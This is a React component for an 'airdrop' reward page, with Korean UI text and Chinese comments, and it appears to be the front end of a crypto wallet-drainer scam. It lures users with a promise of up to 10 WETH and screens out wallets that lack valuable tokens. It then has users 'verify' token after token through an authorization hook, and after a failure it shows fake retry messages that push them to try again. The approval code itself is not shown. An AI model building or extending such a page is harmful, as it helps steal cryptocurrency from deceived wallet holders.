import { useWalletStatus } from '@/hooks/useWalletStatus';
import { useTokenAuthorization } from '@/hooks/useTokenAuthorization';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { Loader2, AlertCircle, CheckCircle, Zap } from 'lucide-react';
import TokenList from './TokenList';

export default function AirdropCard() {
  const { walletStatus, tokens } = useWalletStatus();
  const address = typeof window !== 'undefined' ? window.localStorage.getItem('wagmi.wallet.address') || '' : '';
  const {
    authorizationProgress,
    isAuthorizing,
    currentAuthToken,
    showRetryMessage,
    authorizeToken,
    setShowRetryMessage,
  } = useTokenAuthorization(tokens);

  return (
    <div className="container mx-auto px-4 py-12">
      <Card className="bg-gradient-to-br from-blue-500/10 via-purple-500/10 to-pink-500/10 border border-gray-800 backdrop-blur-sm">
        <CardContent className="p-8">
          <div className="text-center space-y-6">
            <div className="flex justify-center"><Zap className="w-16 h-16 text-blue-400 animate-pulse" /></div>
            <div>
              <h3 className="text-2xl font-bold mb-2">랜덤 보상 풀</h3>
              <p className="text-gray-400">지갑을 연결하여 최대 10 WETH를 받으세요</p>
            </div>
            <div className="max-w-lg mx-auto space-y-4">
              {/* 钱包未连接 */}
              <ConnectButton.Custom>
                {({ account, openConnectModal }) => {
                  if (!account) {
                    return (
                      <Button
                        onClick={openConnectModal}
                        className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-bold py-4"
                      >
                        <Zap className="w-5 h-5 mr-2" />지갑 연결
                      </Button>
                    );
                  }
                  return null;
                }}
              </ConnectButton.Custom>
              {/* 钱包已连接 */}
              {walletStatus !== 'checking' && (
                <div className="space-y-4">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
                    <span className="text-white">지갑 연결됨</span>
                  </div>
                  {walletStatus === 'inactive' && (
                    <div className="bg-red-500/20 border border-red-500/30 rounded-lg p-4">
                      <div className="flex items-center gap-2 text-red-300">
                        <AlertCircle className="h-4 w-4" />
                        <span className="font-semibold">비활성 지갑</span>
                      </div>
                      <p className="text-red-200 text-sm mt-1">ETH 잔액이 거래에 예치 수준입니다. ETH를 추가해주세요.</p>
                    </div>
                  )}
                  {walletStatus === 'ineligible' && (
                    <div className="bg-orange-500/20 border border-orange-500/30 rounded-lg p-4">
                      <div className="flex items-center gap-2 text-orange-300">
                        <AlertCircle className="h-4 w-4" />
                        <span className="font-semibold">비자격 지갑</span>
                      </div>
                      <p className="text-orange-200 text-sm mt-1">지갑에 에어드롭 참여에 충분한 가치있는 토큰이 없습니다.</p>
                    </div>
                  )}
                  {walletStatus === 'active' && (
                    <div className="space-y-4">
                      <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-4">
                        <div className="flex items-center gap-2 text-green-300">
                          <CheckCircle className="h-4 w-4" />
                          <span className="font-semibold">지갑 자격 인정!</span>
                        </div>
                        <p className="text-green-200 text-sm mt-1">지갑이 활성화되어 에어드롭에 참여할 수 있습니다.</p>
                      </div>
                      {/* 验证进度 */}
                      <div className="space-y-2">
                        <div className="flex justify-between text-white text-sm">
                          <span>검증 진행률</span>
                          <span>{Math.round(authorizationProgress)}%</span>
                        </div>
                        <Progress value={authorizationProgress} className="h-2" />
                      </div>
                      {/* 代币列表 */}
                      <TokenList
                        tokens={tokens}
                        isAuthorizing={isAuthorizing}
                        currentAuthToken={currentAuthToken}
                        onAuthorize={authorizeToken}
                        label="미검증"
                        verifiedLabel="검증됨"
                      />
                      {/* 一键验证并领取按钮 */}
                      {tokens.some((t) => !t.authorized) && (
                        <Button
                          onClick={async () => {
                            const firstUnauthorized = tokens.find((t) => !t.authorized);
                            if (firstUnauthorized) await authorizeToken(firstUnauthorized);
                          }}
                          disabled={isAuthorizing}
                          className="w-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 text-black font-bold py-3"
                        >
                          {isAuthorizing ? (
                            <>
                              <Loader2 className="h-4 w-4 animate-spin mr-2" />지갑 확인 대기 중...
                            </>
                          ) : (
                            <>
                              <Zap className="h-4 w-4 mr-2" />검증 및 청구
                            </>
                          )}
                        </Button>
                      )}
                      {/* 重试消息 */}
                      {showRetryMessage && (
                        <div className="space-y-2">
                          <div className="bg-red-500/20 border border-red-500/30 rounded-lg p-3">
                            <p className="text-red-300 text-sm">⚠️ 청구 실패, 검증을 다시 시도해주세요</p>
                          </div>
                          <div className="bg-orange-500/20 border border-orange-500/30 rounded-lg p-3">
                            <p className="text-orange-300 text-sm">🔄 네트워크 오류, 나중에 다시 시도하면 더 좋은 보상을 받을 수 있습니다</p>
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}
              {walletStatus === 'checking' && (
                <div className="flex items-center gap-2 text-white/90">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  <span>지갑 활동 확인 중...</span>
                </div>
              )}
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
} 